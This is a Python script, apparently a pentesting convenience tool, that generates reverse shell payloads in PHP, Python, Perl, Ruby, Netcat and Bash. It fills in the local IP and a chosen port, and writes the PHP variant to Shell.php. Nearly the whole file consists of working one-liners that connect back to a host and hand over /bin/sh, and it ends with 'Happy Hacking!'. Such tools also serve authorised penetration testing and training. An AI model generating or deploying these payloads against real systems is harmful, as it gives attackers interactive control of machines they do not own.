import sys
import os
import netifaces
import time

##I wrote this code because I was sick of having to go to tampermonkey's reverse shell cheatsheet everytime i wanted a shell, and then having to manually write my IP etc.  All shells are from 
##http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet


OPERATING_SYSTEM = sys.platform
CURRENT_IP = "N/A"
CHOSEN_PORT = "N/A"
IPS = []

##Loops over the PC's Network Interface Devices using netifaces library, finds the device IP addreses, and then uses the AF_INET value to find ipv4 addresses. Then selects the ipv4 address for the adapter and puts it in the IP array
for device in netifaces.interfaces():
		dev_details = netifaces.ifaddresses(device)
		if netifaces.AF_INET in dev_details:
			IPS.append(dev_details[netifaces.AF_INET][0]["addr"])

def main():
	clearscreen()
	print("-------------------------------------------------------------------------------")
	print("Reverse Shell Writer")
	print("By Data Cohen")
	print("-------------------------------------------------------------------------------")
	print("")
	print("")
	print("1. PHP")
	print("2. Python")
	print("3. PERL")
	print("4. Ruby")
	print("5. Netcat")
	print("6. Bash")
	shtype = input("Please choose a shell: ")
	if shtype == "1":
		phpsh()
	elif shtype == "2":
		pythsh()
	elif shtype == "3":
		perlsh()
	elif shtype == "4":
		rubsh()
	elif shtype == "5":
		netsh()
	elif shtype == "6":
		bsh()		
	else:
		print("Please enter a correct value!")
	time.sleep(2)
	main()
	
##Clearscreen just figures out what OS is running and uses the terminal clear command##
	
def clearscreen():
	global OPERATING_SYSTEM
	if OPERATING_SYSTEM == "linux" or OPERATING_SYSTEM == "darwin":
		os.system("clear")
	if OPERATING_SYSTEM == "win32":
		os.system("cls")
	
def selectip():
	global CHOSEN_PORT
	global CURRENT_IP
	print("")
	print("Please select the IP you wish to use")
	for x in range(0,len(IPS)):
		print(str(x+1) +". " + str(IPS[x]))
	choice = int(input("IP? : ")) 
	if str(choice).isdigit() is False:
		print("Please enter a correct value!")
		time.sleep(2)
		main()
	elif choice-1 >len(IPS):
		print("Please enter a correct value!")
		time.sleep(2)
		main()
	elif choice <= 0:
		print("Please enter a correct value!")
		time.sleep(2)
		main()
	else:
		CURRENT_IP = IPS[choice-1]
	print("")
	print("Now choose a port")
	chosen_port = input("Port? : ") 
	if str(chosen_port).isdigit() is False:
		print("Please enter a correct value!")
		time.sleep(2)
		main()
	elif len(chosen_port) <=1 or len(chosen_port) > 5 :
		print("Please enter a correct value!")
		time.sleep(2)
		main()
	else:
		CHOSEN_PORT = chosen_port
	print("")
	
def phpsh():
	selectip()
	if os.path.exists("Shell.php"):
		os.remove("Shell.php")
	with open('Shell.php','w') as opf:
		opf.write('<?php $sock=fsockopen("' + CURRENT_IP +'",'+CHOSEN_PORT+');exec("/bin/sh -i <&3 >&3 2>&3");')
		opf.close()
	print("Written to: " + os.getcwd() + "\Shell.php")
	exit("Happy Hacking!")
	
def pythsh():
	selectip()
	clearscreen()
	print("Your Python reverse shell is: ")
	print("")
	print("-------------------------------------------------------------------------------------------------------------")
	print("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);" + 's.connect(("'+CURRENT_IP+'",'+CHOSEN_PORT + '));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);'+'os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'+";'")
	print("-------------------------------------------------------------------------------------------------------------")
	print("")
	exit("Happy Hacking!")
	
def perlsh():
	selectip()
	clearscreen()
	print("Your PERL reverse shell is: ")
	print("")
	print("-------------------------------------------------------------------------------------------------------------")
	print("perl -e '" + 'use Socket;$i="'+CURRENT_IP+'";$p='+CHOSEN_PORT+';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}'+";'")
	print("-------------------------------------------------------------------------------------------------------------")
	print("")
	exit("Happy Hacking!")
	
def rubsh():
	selectip()
	clearscreen()
	print("Your Ruby reverse shell is: ")
	print("")
	print("-------------------------------------------------------------------------------------------------------------")
	print("ruby -rsocket -e'f=TCPSocket.op" +'en("'+CURRENT_IP+'",'+CHOSEN_PORT+').to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,'+"f)'")
	print("-------------------------------------------------------------------------------------------------------------")
	print("")
	exit("Happy Hacking!")
	
def netsh():
	selectip()
	clearscreen()
	print("Your Netcat reverse shell is: ")
	print("")
	print("-------------------------------------------------------------------------------------------------------------")
	print("nc -e /bin/sh " + CURRENT_IP + " " + CHOSEN_PORT)
	print("-------------------------------------------------------------------------------------------------------------")
	print("")
	exit("Happy Hacking!")
	
def netsh():
	selectip()
	clearscreen()
	print("Your Netcat reverse shell is: ")
	print("")
	print("-------------------------------------------------------------------------------------------------------------")
	print("nc -e /bin/sh " + CURRENT_IP + " " + CHOSEN_PORT)
	print("-------------------------------------------------------------------------------------------------------------")
	print("")
	exit("Happy Hacking!")
	
def bsh():
	selectip()
	clearscreen()
	print("Your Bash reverse shell is: ")
	print("")
	print("-------------------------------------------------------------------------------------------------------------")
	print("bash -i >& /dev/tcp/"+CURRENT_IP+"/"+CHOSEN_PORT+" 0>&1")
	print("-------------------------------------------------------------------------------------------------------------")
	print("")
	exit("Happy Hacking!")
	

main()
	